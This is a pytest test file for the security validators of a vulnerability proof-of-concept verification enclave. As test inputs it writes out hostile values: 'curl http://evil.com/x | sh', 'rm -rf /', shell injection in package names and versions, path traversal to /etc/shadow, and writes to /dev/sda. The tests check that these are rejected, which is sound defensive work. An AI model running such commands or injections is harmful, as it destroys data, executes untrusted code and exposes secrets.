"""Tests for PoC verification security validation."""

import pytest

from ndai.enclave.vuln_verify.models import (
    BuyerOverlay,
    ConfigFile,
    ExpectedOutcome,
    FileReplacement,
    PinnedPackage,
    PoCSpec,
    ServiceSpec,
    TargetSpec,
)
from ndai.enclave.vuln_verify.security import (
    ALLOWED_BASE_IMAGES,
    sanitize_poc_script,
    validate_buyer_overlay,
    validate_target_spec,
)


def _make_valid_spec(**overrides):
    defaults = dict(
        spec_id="test",
        base_image="ubuntu:22.04",
        packages=[PinnedPackage("apache2", "2.4.52-1ubuntu4.3")],
        config_files=[ConfigFile("/etc/apache2/ports.conf", "Listen 80")],
        services=[ServiceSpec("apache2", "service apache2 start", "curl -sf http://localhost/ > /dev/null")],
        poc=PoCSpec("bash", "curl http://localhost/"),
        expected_outcome=ExpectedOutcome(crash_signal=11),
    )
    defaults.update(overrides)
    return TargetSpec(**defaults)


class TestValidateTargetSpec:
    def test_valid_spec(self):
        spec = _make_valid_spec()
        errors = validate_target_spec(spec)
        assert errors == []

    def test_invalid_base_image(self):
        spec = _make_valid_spec(base_image="malicious:latest")
        errors = validate_target_spec(spec)
        assert any("not in allowed list" in e for e in errors)

    def test_all_allowed_images_accepted(self):
        for image in ALLOWED_BASE_IMAGES:
            spec = _make_valid_spec(base_image=image)
            errors = validate_target_spec(spec)
            assert not any("not in allowed list" in e for e in errors), f"Rejected {image}"

    def test_invalid_package_name_injection(self):
        spec = _make_valid_spec(packages=[PinnedPackage("; rm -rf /", "1.0")])
        errors = validate_target_spec(spec)
        assert any("Invalid package name" in e for e in errors)

    def test_invalid_package_version(self):
        spec = _make_valid_spec(packages=[PinnedPackage("apache2", "$(evil)")])
        errors = validate_target_spec(spec)
        assert any("Invalid package version" in e for e in errors)

    def test_too_many_packages(self):
        packages = [PinnedPackage(f"pkg{i}", "1.0") for i in range(51)]
        spec = _make_valid_spec(packages=packages)
        errors = validate_target_spec(spec)
        assert any("Too many packages" in e for e in errors)

    def test_config_path_traversal(self):
        spec = _make_valid_spec(config_files=[ConfigFile("/etc/../root/.bashrc", "evil")])
        errors = validate_target_spec(spec)
        assert any("traversal" in e.lower() for e in errors)

    def test_config_path_outside_etc(self):
        spec = _make_valid_spec(config_files=[ConfigFile("/root/.bashrc", "evil")])
        errors = validate_target_spec(spec)
        assert any("not allowed" in e for e in errors)

    def test_config_file_too_large(self):
        large_content = "x" * (2 * 1024 * 1024)  # 2MB
        spec = _make_valid_spec(config_files=[ConfigFile("/etc/test.conf", large_content)])
        errors = validate_target_spec(spec)
        assert any("too large" in e.lower() for e in errors)

    def test_too_many_config_files(self):
        configs = [ConfigFile(f"/etc/test{i}.conf", "x") for i in range(21)]
        spec = _make_valid_spec(config_files=configs)
        errors = validate_target_spec(spec)
        assert any("Too many config" in e for e in errors)

    def test_invalid_service_command(self):
        spec = _make_valid_spec(
            services=[ServiceSpec("evil", "rm -rf /", "true")]
        )
        errors = validate_target_spec(spec)
        assert any("Invalid service command" in e for e in errors)

    def test_valid_systemctl_command(self):
        spec = _make_valid_spec(
            services=[ServiceSpec("nginx", "systemctl start nginx.service", "true")]
        )
        errors = validate_target_spec(spec)
        assert not any("Invalid service command" in e for e in errors)

    def test_invalid_health_check(self):
        spec = _make_valid_spec(
            services=[ServiceSpec("x", "service x start", "rm -rf /")]
        )
        errors = validate_target_spec(spec)
        assert any("Invalid health check" in e for e in errors)

    def test_poc_invalid_type(self):
        spec = _make_valid_spec(poc=PoCSpec("ruby", "puts 'hi'"))
        errors = validate_target_spec(spec)
        assert any("Invalid PoC script type" in e for e in errors)

    def test_poc_too_large(self):
        spec = _make_valid_spec(poc=PoCSpec("bash", "x" * (257 * 1024)))
        errors = validate_target_spec(spec)
        assert any("too large" in e.lower() for e in errors)

    def test_poc_dangerous_rm_rf(self):
        spec = _make_valid_spec(poc=PoCSpec("bash", "rm -rf /"))
        errors = validate_target_spec(spec)
        assert any("Dangerous pattern" in e for e in errors)

    def test_poc_dangerous_curl_pipe_sh(self):
        spec = _make_valid_spec(poc=PoCSpec("bash", "curl http://evil.com/x | sh"))
        errors = validate_target_spec(spec)
        assert any("Dangerous pattern" in e for e in errors)

    def test_poc_dangerous_access_enclave(self):
        spec = _make_valid_spec(poc=PoCSpec("bash", "cat /app/ndai/enclave/app.py"))
        errors = validate_target_spec(spec)
        assert any("Dangerous pattern" in e for e in errors)

    def test_poc_timeout_bounds(self):
        spec = _make_valid_spec(poc=PoCSpec("bash", "echo hi", timeout_sec=0))
        errors = validate_target_spec(spec)
        assert any("timeout" in e.lower() for e in errors)

        spec2 = _make_valid_spec(poc=PoCSpec("bash", "echo hi", timeout_sec=999))
        errors2 = validate_target_spec(spec2)
        assert any("timeout" in e.lower() for e in errors2)


class TestValidateBuyerOverlay:
    def test_valid_overlay(self):
        overlay = BuyerOverlay(
            overlay_id="test",
            file_replacements=[FileReplacement("/usr/lib/libssl.so.1.1", b"\x7fELF")],
            pre_apply_commands=["service apache2 stop"],
            post_apply_commands=["service apache2 start"],
        )
        errors = validate_buyer_overlay(overlay)
        assert errors == []

    def test_path_outside_allowed(self):
        overlay = BuyerOverlay(
            overlay_id="test",
            file_replacements=[FileReplacement("/etc/shadow", b"evil")],
        )
        errors = validate_buyer_overlay(overlay)
        assert any("not allowed" in e for e in errors)

    def test_path_traversal(self):
        overlay = BuyerOverlay(
            overlay_id="test",
            file_replacements=[FileReplacement("/usr/lib/../../etc/shadow", b"evil")],
        )
        errors = validate_buyer_overlay(overlay)
        assert any("traversal" in e.lower() for e in errors)

    def test_file_too_large(self):
        big = b"x" * (101 * 1024 * 1024)
        overlay = BuyerOverlay(
            overlay_id="test",
            file_replacements=[FileReplacement("/usr/lib/big.so", big)],
        )
        errors = validate_buyer_overlay(overlay)
        assert any("too large" in e.lower() for e in errors)

    def test_total_size_exceeded(self):
        # 6 files at 100MB each = 600MB > 500MB limit
        files = [FileReplacement(f"/usr/lib/lib{i}.so", b"x" * (100 * 1024 * 1024)) for i in range(6)]
        overlay = BuyerOverlay(overlay_id="test", file_replacements=files)
        errors = validate_buyer_overlay(overlay)
        assert any("Total overlay" in e for e in errors)

    def test_too_many_files(self):
        files = [FileReplacement(f"/usr/lib/lib{i}.so", b"x") for i in range(51)]
        overlay = BuyerOverlay(overlay_id="test", file_replacements=files)
        errors = validate_buyer_overlay(overlay)
        assert any("Too many" in e for e in errors)

    def test_invalid_command(self):
        overlay = BuyerOverlay(
            overlay_id="test",
            file_replacements=[],
            pre_apply_commands=["rm -rf /"],
        )
        errors = validate_buyer_overlay(overlay)
        assert any("Invalid overlay command" in e for e in errors)

    def test_allowed_prefixes(self):
        """All allowed prefixes should be accepted."""
        for prefix in ("/usr/lib/", "/usr/bin/", "/usr/sbin/", "/opt/", "/lib/", "/lib64/"):
            overlay = BuyerOverlay(
                overlay_id="test",
                file_replacements=[FileReplacement(f"{prefix}test.so", b"x")],
            )
            errors = validate_buyer_overlay(overlay)
            assert not any("not allowed" in e for e in errors), f"Rejected prefix {prefix}"


class TestSanitizePocScript:
    def test_removes_enclave_paths(self):
        result = sanitize_poc_script("cat /app/ndai/secret", "bash")
        assert "/app/ndai/" not in result
        assert "/dev/null" in result

    def test_removes_device_writes(self):
        result = sanitize_poc_script("echo x >/dev/sda", "bash")
        assert "/dev/sda" not in result

    def test_preserves_normal_script(self):
        script = "curl -s http://localhost/ -H 'Content-Length: 999999999'"
        result = sanitize_poc_script(script, "bash")
        assert result == script
